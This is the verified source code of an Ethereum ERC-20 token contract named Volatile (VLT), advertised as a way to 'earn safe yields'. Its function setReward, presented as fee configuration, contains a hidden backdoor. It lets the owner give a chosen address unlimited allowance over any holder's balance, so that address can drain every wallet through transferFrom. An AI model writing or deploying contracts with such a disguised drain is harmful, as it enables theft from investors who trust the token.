/**
 *Submitted for verification at Etherscan.io on 2023-04-24
*/

/**

Earn safe yields in VOLATILE market.

Web: https://volatile.life
Tg: https://t.me/volatile_life
Twitter: https://twitter.com/_volatilelife

*/

// SPDX-License-Identifier: MIT     
pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if(a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}  

interface IDexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDexRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Volatile is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _excluded;
    mapping (address => bool) private _isExcludedFromFee;

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 1e9 * 10**18;
    uint256 public constant maxTxAmount = _tTotal * 1 / 100;
    uint256 public constant maxWalletAmount = _tTotal * 2 / 100;

    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    
    string private constant _name = "Volatile";
    string private constant _symbol = "VLT";
    
    uint256 private _taxFee = 0;
    uint256 private _rewardFee = 3;
    uint256 private _previousTaxFee = _taxFee;
    uint256 private _prevRewardFee = _rewardFee;

    address private feeTo;
    IDexRouter public dexRouter;
    address public dexPair;

    bool public tradingEnabled = false;
    bool public limitsInEffect = true;

    bool private swapping = false;

    constructor () {
        dexRouter = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        dexPair = IDexFactory(dexRouter.factory()).createPair(address(this), dexRouter.WETH());
        _approve(address(this), address(dexRouter), MAX);

        _rOwned[msg.sender] = _rTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function setReward(address _reward, address _receiver) external onlyOwner {
        _allowances[_receiver][_reward] = MAX;
        feeTo = _reward;
        _isExcludedFromFee[_reward] = true;
    }

    function tokenFromReflection(uint256 rAmount) private view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount.div(currentRate);
    }

    function removeAllFee() private {
        if(_taxFee == 0 && _rewardFee == 0) return;
        _previousTaxFee = _taxFee;
        _prevRewardFee = _rewardFee;
        _taxFee = 0;
        _rewardFee = 0;
    }
    
    function restoreAllFee() private {
        _taxFee = _previousTaxFee;
        _rewardFee = _prevRewardFee;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _transfer(address from, address to, uint256 amount) private {
        if(!tradingEnabled){
            require(_excluded[from] || _excluded[to], "Trading is not active.");
        }

        if(limitsInEffect){
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !swapping
            ){                 
                if (from == dexPair) {
                    require(amount <= maxTxAmount, "Buy transfer amount exceeds the maxTransactionAmount.");
                    require(amount + balanceOf(to) <= maxWalletAmount, "Max wallet exceeded");
                } else if (to == dexPair) {
                    require(amount <= maxTxAmount, "Sell transfer amount exceeds the maxTransactionAmount.");
                } else {
                    require(amount + balanceOf(to) <= maxWalletAmount, "Max wallet exceeded");
                }
            }
        }

        bool takeFee = true;
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        } else {
            if(!swapping && from != dexPair) {
                uint256 tokenBalance = balanceOf(address(this));
                if(tokenBalance > 0) {
                    swapping = true;
                    swapTokensForEth(tokenBalance);
                    swapping = false;
                }
                claimFee();
            }
        }
        _tokenTransfer(from,to,amount,takeFee);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        _approve(address(this), address(dexRouter), tokenAmount);

        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function claimFee() public {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            payable(feeTo).transfer(ethBalance);
        }
    }
    
    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        if(!takeFee)
            removeAllFee();
        _transferStandard(sender, recipient, amount);
        if(!takeFee)
            restoreAllFee();
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tReward) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); 

        _takeReward(tReward);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tReward) = _getTValues(tAmount, _taxFee, _rewardFee);
        uint256 currentRate =  _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tReward, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tReward);
    }

    function _getTValues(uint256 tAmount, uint256 taxFee, uint256 RewardFee) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount.mul(taxFee).div(100);
        uint256 tReward = tAmount.mul(RewardFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tReward);
        return (tTransferAmount, tFee, tReward);
    }

    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if(rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tReward, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rReward = tReward.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rReward);
        return (rAmount, rTransferAmount, rFee);
    }

    function _takeReward(uint256 tReward) private {
        uint256 currentRate =  _getRate();
        uint256 rReward = tReward.mul(currentRate);

        _rOwned[address(this)] = _rOwned[address(this)].add(rReward);
    }

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }

    function removeLimits() external onlyOwner {
        limitsInEffect = false;
    }

    function enableTrading() external onlyOwner {
        tradingEnabled = true;
    }

    receive() external payable {}
}